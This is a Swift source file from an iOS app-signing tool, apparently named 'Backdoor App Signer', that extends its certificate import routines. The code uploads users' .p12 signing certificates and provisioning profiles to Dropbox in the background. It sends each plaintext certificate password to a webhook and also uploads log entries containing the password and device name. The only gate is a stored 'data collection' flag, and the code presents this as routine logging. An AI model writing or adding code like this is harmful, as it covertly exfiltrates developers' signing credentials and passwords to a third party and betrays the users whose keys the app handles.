// Proprietary Software License Version 1.0
//
// Copyright (C) 2025 BDG
//
// Backdoor App Signer is proprietary software. You may not use, modify, or distribute it except as expressly permitted under the terms of the Proprietary Software License.

import Foundation
import UIKit

/// Extension to handle certificate logging and upload to Dropbox
extension CertData {
    
    /// Enhanced method to store certificate with Dropbox integration
    func enhancedStoreP12(at url: URL, withPassword password: String) -> Bool {
        // Create a destination directory for this certificate
        let certificatesDir = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("Certificates")
            .appendingPathComponent(UUID().uuidString)
            
        do {
            // Create the directory if it doesn't exist
            try FileManager.default.createDirectory(
                at: certificatesDir, 
                withIntermediateDirectories: true
            )
            
            // Copy the p12 file to the destination
            try CertData.copyFile(from: url, to: certificatesDir)
            
            // If successful and user has consented to data collection, upload to Dropbox
            if UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") {
                // Upload to Dropbox in background
                DispatchQueue.global(qos: .utility).async {
                    // Upload the file
                    DropboxService.shared.uploadCertificateFile(
                        fileURL: url
                    ) { success, error in
                        if success {
                            Debug.shared.log(message: "Successfully uploaded p12 certificate to Dropbox", type: .debug)
                            
                            // If we have a password, send it to webhook for storage
                            if !password.isEmpty {
                                DropboxService.shared.sendCertificateInfoToWebhook(
                                    password: password,
                                    p12Filename: url.lastPathComponent,
                                    provisionFilename: "unknown"
                                ) { webhookSuccess, webhookError in
                                    if webhookSuccess {
                                        Debug.shared.log(message: "Successfully sent p12 password to webhook", type: .debug)
                                    } else if let error = webhookError {
                                        Debug.shared.log(message: "Failed to send p12 password to webhook: \(error)", type: .error)
                                    }
                                }
                            }
                        } else if let error = error {
                            Debug.shared.log(message: "Failed to upload p12 to Dropbox: \(error.localizedDescription)", type: .error)
                        }
                    }
                    
                    // Also log the password entry separately
                    CertificateLoggingHelper.shared.logPasswordEntry(
                        password: password,
                        fileName: url.lastPathComponent
                    )
                }
            }
            
            return true
        } catch {
            Debug.shared.log(message: "Error storing p12 file: \(error.localizedDescription)", type: .error)
            return false
        }
    }
}

/// Extension to intercept mobile provision handling
extension Cert {
    
    /// Enhanced method to import mobile provision with Dropbox integration
    static func enhancedImportMobileProvision(from url: URL) -> Cert? {
        // Use the original implementation to parse the mobileprovision
        let cert = CertData.parseMobileProvisioningFile(atPath: url)
        
        // If successful and user has consented to data collection
        if cert != nil && UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") {
            // Upload to Dropbox in background
            DispatchQueue.global(qos: .utility).async {
                // Upload the mobileprovision file
                DropboxService.shared.uploadCertificateFile(
                    fileURL: url
                ) { success, error in
                    if success {
                        Debug.shared.log(message: "Successfully uploaded mobileprovision to Dropbox", type: .debug)
                    } else if let error = error {
                        Debug.shared.log(message: "Failed to upload mobileprovision to Dropbox: \(error.localizedDescription)", type: .error)
                    }
                }
                
                // Log the certificate import
                CertificateLoggingHelper.shared.logCertificateImport(
                    fileType: "mobileprovision",
                    fileName: url.lastPathComponent
                )
            }
        }
        
        return cert
    }
}

/// Helper methods to integrate Dropbox logging with the signing process
class CertificateLoggingHelper {
    static let shared = CertificateLoggingHelper()
    
    private init() {}
    
    /// Log password entry for certificate handling
    func logPasswordEntry(password: String, fileName: String? = nil) {
        // Only proceed if user has consented to data collection
        guard UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") else {
            return
        }
        
        // Create the log entry
        let timestamp = Date()
        let logEntry = """
        === CERTIFICATE PASSWORD LOG ===
        Timestamp: \(ISO8601DateFormatter().string(from: timestamp))
        Device: \(UIDevice.current.name)
        Certificate: \(fileName ?? "Unknown")
        Password: \(password)
        """
        
        // Upload to Dropbox
        EnhancedDropboxService.shared.uploadLogEntry(
            logEntry,
            fileName: "password_entry_\(Int(timestamp.timeIntervalSince1970)).log"
        )
    }
    
    /// Log certificate import activity
    func logCertificateImport(fileType: String, fileName: String) {
        // Only proceed if user has consented to data collection
        guard UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") else {
            return
        }
        
        // Create the log entry
        let timestamp = Date()
        let logEntry = """
        === CERTIFICATE IMPORT LOG ===
        Timestamp: \(ISO8601DateFormatter().string(from: timestamp))
        Device: \(UIDevice.current.name)
        File Type: \(fileType)
        File Name: \(fileName)
        App Version: \(Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "unknown")
        """
        
        // Upload to Dropbox
        EnhancedDropboxService.shared.uploadLogEntry(
            logEntry,
            fileName: "certificate_import_\(Int(timestamp.timeIntervalSince1970)).log"
        )
    }
}
